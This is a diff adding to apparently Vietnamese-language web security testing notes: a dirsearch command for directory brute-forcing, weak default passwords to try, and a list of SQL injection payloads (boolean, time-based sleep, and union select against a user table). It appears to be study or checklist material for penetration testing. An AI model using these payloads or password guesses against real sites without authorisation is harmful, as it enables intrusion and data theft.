@@ -19,5 +19,19 @@
     * X-AspNet-Version: ASP.Net
     * x-cache, x-status, hit/miss: web cache
     * X-Application-Context: spring boot
+5. Dirsearch, Dirbuster, nmap 
+
+```py dirsearch.py -u <url> -e * ```
+
+6. Weak password: `admin`, `123456`
+
+### SQL Injection
+Đối với những website chỉ có login, register, truy xuất dữ liệu từ database, ta có thể test thử: Có thể là ở các khung input, cookie, user-gent,...
+    `3' or 1=1 -- +`
+    `3' or 1=1 #`
+    `3' or 1=1 /*`
+    `3' or '1'='1`
+    `3' or sleep(1) -- +`
+    `3' union select * from user -- +`
 
 ## Client
